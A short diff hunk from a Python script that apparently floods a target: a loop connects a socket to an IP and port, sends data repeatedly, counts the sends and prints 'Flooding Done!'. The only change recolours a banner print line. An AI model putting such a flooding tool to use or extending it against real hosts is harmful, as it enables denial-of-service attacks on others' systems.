@@ -91,7 +91,7 @@ def start():
          s.connect((ip,port))
          s.send(r)
          u += 1
-         print("\033[92m[\033[1m+\033[92m]\033[92m0ps BADAI GURUN " +str(u)+ "    \033[1mZN33P3R 6453 " +str()+ "   \033[1m" +ip+ "\033[0m" )
+         print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN " +str(u)+ "    \033[1mZN33P3R 6453 " +str()+ "   \033[1m" +ip+ "\033[0m" )
        finally:
          s.close()
          print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")
